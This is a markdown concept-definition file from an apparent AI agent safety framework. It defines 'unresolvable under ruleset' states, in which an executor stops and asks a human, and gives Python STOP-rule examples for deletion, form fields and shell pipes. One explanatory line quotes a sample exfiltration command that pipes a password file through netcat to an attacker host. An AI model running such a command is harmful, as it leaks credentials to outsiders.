# Unresolvable Under Ruleset

**Version**: 1.0.0
**Status**: Initial Definition
**Last Updated**: 2025-12-20

---

## Definition

**Unresolvable Under Ruleset**: A system state where, given the current rule set and available context, no action can be determined to be safe or appropriate without external input, triggering a mandatory stop.

**One-Sentence Summary**: When the ruleset cannot determine "this is safe," execution must stop and ask.

---

## What This Is NOT

**NOT Missing Information**:
- This is not "I need more data to decide"
- This is "Even with all data, ruleset cannot resolve"

**NOT Uncertainty**:
- Uncertainty: "Might be safe" (probabilistic)
- Unresolvable: "Cannot determine safety under rules" (structural)

**NOT Error**:
- Error: System malfunction (unexpected)
- Unresolvable: Boundary detection (expected, designed)

**NOT Ambiguity in Action**:
- "What action should I perform?" (planning problem)
- vs. "Is this action safe?" (judgment boundary)

---

## Key Properties

### 1. Ruleset Exhaustion

**Condition**: All applicable rules checked, none provide "safe to proceed" determination

**Result**: Cannot proceed without external decision

**Not Timeout**: Not about computational limits, about logical incompleteness

---

### 2. Conservative Default

**Principle**: When unresolvable, default to STOP (not proceed)

**Rationale**: Safer to over-stop than under-stop

**Trade-off**: Reduces automation efficiency, increases safety

---

### 3. Data vs Resolvability

**More Data Doesn't Help**: Even perfect information might not make action resolvable

**Example**: "Delete all files" - completely clear what to do, but unresolvable (requires judgment)

**Distinction**: Clarity of action ≠ Resolvability of safety

---

## Examples

### Example 1: Destructive Action

```python
def check_delete_file(path):
    # Rule 1: Destructive actions are unresolvable
    if is_destructive(action):
        return StopResult(
            should_stop=True,
            reason="Unresolvable: Destructive action requires judgment"
        )

    # No rule says "safe to proceed"
    return StopResult(should_stop=False, reason="No STOP rules triggered")
```

**Why Unresolvable**: Deletion is irreversible, ruleset cannot determine "this deletion is safe" without external judgment.

---

### Example 2: Input Field Detection

```python
def check_input_field(page):
    # Rule: Forms are unresolvable (auto-fill risk)
    if page.locator('input[type="text"]').is_visible():
        return StopResult(
            should_stop=True,
            reason="Unresolvable: Input field detected (auto-fill risk)"
        )

    return StopResult(should_stop=False, reason="No inputs detected")
```

**Why Unresolvable**: Ruleset cannot determine "this form is safe to auto-fill" (requires knowing context, intent).

---

### Example 3: Shell Pipe Detection

```python
def check_shell_command(command):
    # Rule: Pipes are unresolvable (redirection risk)
    if '|' in command or '>' in command:
        return StopResult(
            should_stop=True,
            reason="Unresolvable: Shell redirection detected"
        )

    return StopResult(should_stop=False, reason="No redirection")
```

**Why Unresolvable**: Pipe might be safe (`ls | grep`) or unsafe (`cat password | nc attacker.com`), ruleset cannot distinguish.

---

## Counter-Examples

### Counter-Example 1: Clearly Safe Action

```python
def check_read_file(path):
    # Reading is resolvable (non-destructive)
    if action == 'read' and os.path.exists(path):
        return StopResult(should_stop=False, reason="Read-only, safe")

    # Not unresolvable - ruleset says "proceed"
```

**Why NOT Unresolvable**: Ruleset can determine safety (read-only operations are safe).

---

### Counter-Example 2: Missing Information (Not Unresolvable)

```python
def check_with_missing_info(action):
    # This is poor design, not unresolvability
    if not has_user_preference(action):
        return StopResult(
            should_stop=True,
            reason="Missing user preference"  # NOT unresolvable
        )
```

**Why NOT Unresolvable**: This is missing data (could be retrieved), not fundamental inability to resolve.

---

### Counter-Example 3: AI Uncertainty (Not Unresolvable)

```python
def check_with_ai_assessment(action):
    risk_score = ai_model.assess_risk(action)

    if risk_score > 0.5:
        return StopResult(
            should_stop=True,
            reason="AI uncertain about safety"  # NOT unresolvable
        )
```

**Why NOT Unresolvable**: AI uncertainty is probabilistic judgment, not ruleset exhaustion.

---

## Differentiation from Related Concepts

### vs. Halting Problem

| Aspect | Halting Problem | Unresolvable Under Ruleset |
|--------|----------------|----------------------------|
| Domain | Computability theory | Decision authority |
| Question | "Will this program halt?" | "Is this action safe?" |
| Resolution | Undecidable (mathematically) | Unresolvable (under ruleset) |
| Workaround | None (fundamental limit) | External decision (architectural) |

---

### vs. Incomplete Information

| Aspect | Incomplete Information | Unresolvable Under Ruleset |
|--------|----------------------|----------------------------|
| Problem | Missing data | Ruleset limitation |
| Solution | Gather more data | Ask external authority |
| Nature | Empirical (can be filled) | Structural (cannot be filled by data) |
| Example | "What's in this file?" | "Should I delete this file?" |

---

### vs. AI Uncertainty

| Aspect | AI Uncertainty | Unresolvable Under Ruleset |
|--------|----------------|----------------------------|
| Source | Model confidence | Rule exhaustion |
| Type | Probabilistic | Binary (resolvable or not) |
| Improvement | Better model → less uncertainty | Better rules → different boundary |
| Example | "70% sure this is safe" | "Ruleset cannot determine safety" |

---

## Conceptual Boundaries

**Unresolvable Under Ruleset IS**:
- Logical incompleteness of ruleset
- Boundary detection (designed behavior)
- Conservative STOP trigger

**Unresolvable Under Ruleset IS NOT**:
- System error (malfunction)
- Missing information (data gap)
- Computational limit (timeout)

**Unresolvable Under Ruleset TRIGGERS**:
- Mandatory STOP
- External decision request
- Telemetry event (boundary reached)

---

## Usage in Echo Judgment System

**STOP Rules as Unresolvability Detectors**:

1. **Destructive Action Detected**:
   - Unresolvable: Cannot determine "this deletion is safe" → STOP

2. **Input Field Detected**:
   - Unresolvable: Cannot determine "this form is safe to fill" → STOP

3. **Redirect/Navigation Outside Domain**:
   - Unresolvable: Cannot determine "this external site is safe" → STOP

4. **Shell Pipes/Redirection**:
   - Unresolvable: Cannot determine "this pipe is safe" → STOP

**Common Pattern**: When action has irreversible consequence or external effect, ruleset declares unresolvable.

---

## Conservative STOP Philosophy

**Principle**: If unresolvable, STOP (not proceed with best guess)

**Rationale**:
- False STOP (stop when safe) → inconvenience
- False proceed (proceed when unsafe) → harm

**Trade-off**: Accepts higher STOP rate for stronger safety boundary

**Implementation**: STOP rules are deliberately conservative (see PRINCIPLES.md)

---

## False Positives Are Data

**Traditional View**: False positive STOP = bug to fix

**This System's View**: False positive STOP = ruleset boundary data

**Example**:
- Task: `ls -la | grep foo`
- STOP: Pipe character detected
- Human: Approves (safe command)
- Interpretation: Ruleset boundary detected (unresolvable), human resolved

**Not a Bug**: Ruleset correctly identified unresolvability. Human provided resolution.

---

## Ruleset Evolution

**Current Ruleset**: Conservative (many unresolvables)

**Hypothetical Refined Ruleset**: Fewer unresolvables (more specificity)

**Example**:
```python
# Current: All pipes unresolvable
if '|' in command:
    return StopResult(should_stop=True, ...)

# Hypothetical: Only pipes with network unresolvable
if '|' in command and has_network_command(command):
    return StopResult(should_stop=True, ...)
```

**Trade-off**: More specific rules → fewer STOPs, but more complex ruleset (more bugs)

**This System's Choice**: Keep rules simple, accept more STOPs.

---

## Common Misunderstandings

**Misunderstanding 1**: "Unresolvable means system is broken"

**Correction**: Unresolvable is boundary detection (designed, not error).

---

**Misunderstanding 2**: "More data would resolve it"

**Correction**: Unresolvability is structural (ruleset limitation), not empirical (data gap).

---

**Misunderstanding 3**: "AI should resolve ambiguity"

**Correction**: Unresolvability triggers external decision (AI has no authority to resolve).

---

**Misunderstanding 4**: "False positives should be eliminated"

**Correction**: False positives reveal ruleset boundaries (data, not bugs).

---

## Analogy: Legal Precedent Gaps

**Legal System**: Judge encounters case with no precedent (unresolvable under current law)

**Cannot Resolve**: Judge can't invent law to decide case

**Must Escalate**: Case goes to higher court or legislature

**Same Pattern Here**: Ruleset encounters unresolvable case → escalates to external authority (human).

---

## Design Implications

**For STOP Rules**:
- Identify unresolvable patterns (destructive, external, irreversible)
- Default to STOP when unresolvable
- Document why pattern is unresolvable

**For Executors**:
- No responsibility to resolve ambiguity
- STOP when unresolvable, pass to decision layer

**For Humans**:
- Understand STOPs as boundary detection (not errors)
- Provide resolution (judgment that ruleset cannot make)

---

## Testing for Unresolvability

**Test**: Given perfect information, can ruleset determine safety?

**Examples**:

| Action | Perfect Information | Resolvable? |
|--------|-------------------|-------------|
| Read file | File exists, readable | YES (safe) |
| Delete file | File exists, writable | NO (requires judgment) |
| Navigate to URL | URL valid, reachable | NO (external site, requires judgment) |
| Run `ls` | Command valid | YES (read-only) |
| Run `ls \| grep` | Command valid | NO (pipe, requires judgment) |

**Pattern**: If action has irreversible/external consequence, likely unresolvable.

---

## Related Concepts

**Depends On**:
- State-Driven Interlock (enforcement when unresolvable)
- Judgment Cannot Fire (why executor cannot resolve)
- Execution Without Judgment (executor has no resolution authority)

**Triggers**:
- STOP event (telemetry)
- External decision request (human input)

---

## Research Implications

**Testable Hypothesis**: Systems with explicit unresolvability detection have lower rates of unauthorized execution than systems that attempt resolution under uncertainty.

**Measurement**: Compare boundary violations in STOP-on-unresolvable vs proceed-with-confidence systems.

**Null Hypothesis**: Unresolvability detection does not affect violation rate.

---

## Version History

**v1.0.0** (2025-12-20): Initial definition

---

## References

**Echo Judgment System**: See PRINCIPLES.md (Principle 2: STOP Is Observation, Not Failure)

**STOP Rules**: See `ops/tools/headed_executor/stop_checker.py` (unresolvability detectors)

**Evidence**: See incidents/ for examples of unresolvable cases and human resolutions

---

## Citation

```
Unresolvable Under Ruleset, Echo Judgment System Concept Vocabulary
Version: 1.0.0
Repository: https://github.com/Nick-heo-eg/echo-judgment-concept-vocabulary
Last Updated: 2025-12-20
```
